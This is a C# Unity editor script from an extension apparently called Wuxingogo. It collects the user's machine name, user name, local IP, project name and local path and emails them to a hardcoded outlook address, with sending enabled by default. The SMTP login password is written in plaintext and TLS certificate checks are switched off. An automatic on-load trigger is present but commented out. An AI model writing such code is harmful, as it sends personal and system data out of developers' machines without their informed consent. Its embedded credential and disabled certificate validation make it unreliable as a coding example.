	using System;
	using System.Collections;
	using System.IO;
	using System.Net;
	using System.Net.Mail;
	using System.Net.Security;
	using System.Net.Sockets;
	using System.Reflection;
	using System.Security.Cryptography.X509Certificates;
	using UnityEditor;
	using UnityEngine;
	using wuxingogo.Data;
	using wuxingogo.Runtime;


	public class MailInfo
	{
		public static string PREFS_KEY = "IS_SEND_EMAIL";
		[MenuItem("Wuxingogo/Tools/Send Computer Info")]
		//[InitializeOnLoadMethod]
		public static void OnLoad()
		{
			CheckMail();
		}
		[MenuItem("Wuxingogo/Tools/Active Send Info")]
		public static void ActiveSendComputerInfo()
		{
			var enableSendMsg = EditorPrefs.GetBool(PREFS_KEY, true);
			enableSendMsg = !enableSendMsg;
			EditorPrefs.SetBool(PREFS_KEY, enableSendMsg);
		}
		[X]
		public static void CheckMail()
		{
			var sendMsg = EditorPrefs.GetBool(PREFS_KEY, true);
			if (sendMsg)
			{
				SendInfo();
			}
		}
		[X]
		public static void SendInfo()
		{
			MailMessage mail = new MailMessage();
 
			mail.From = new MailAddress(fromEmail);
			mail.To.Add(toEmail);
			mail.Subject = "Wuxingogo Extension Info";
			mail.Body = GetComputerInfo();
 
			SmtpClient smtpServer = new SmtpClient(mailHost);
			smtpServer.Port = 587;
			smtpServer.Credentials = new System.Net.NetworkCredential(fromEmail ,password) as ICredentialsByHost;
			smtpServer.EnableSsl = true;
			ServicePointManager.ServerCertificateValidationCallback = 
				delegate(object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) 
				{ return true; };
			smtpServer.Send(mail);
         
		}

		public static string toEmail = "wuxingogo@outlook.com";
		public static string fromEmail = "1975007286@qq.com";
		public static string mailHost = "smtp.qq.com";
		public static string password = "oxfzejnyxjipbbej";
		[X]
		public static string GetComputerInfo()
		{
			string hostName = Dns.GetHostName();   //获取本机名
			IPHostEntry localhost = Dns.GetHostByName(hostName);    //方法已过期，可以获取IPv4的地址
			//IPHostEntry localhost = Dns.GetHostEntry(hostName);   //获取IPv6地址
			IPAddress localaddr = localhost.AddressList[0];

			string context = "Computer IP : " + GetExternalIP() + "\n"
			                 + "Computer Name : " + Environment.MachineName + "\n"
			                 + "Local IP : " + GetLocalIPAddress() + "\n"
			                 + "User name : " + System.Environment.UserName + "\n"
			                 + "Project name : " + Application.productName + "\n"
			                 + "Local path : " + Application.dataPath + "\n"
							 + "\n";
			
			return context;
		}
		
		
		public static string GetLocalIPAddress()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		
		//获取外网IP
		private static string GetExternalIP()
		{
			return "";
			string direction = "";
			WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
			using (WebResponse response = request.GetResponse())
			using (StreamReader stream = new StreamReader(response.GetResponseStream()))
			{
				direction = stream.ReadToEnd();
			}
			int first = direction.IndexOf("Address:") + 9;
			int last = direction.LastIndexOf("</body>");
			direction = direction.Substring(first, last - first);
			return direction;
		}
	}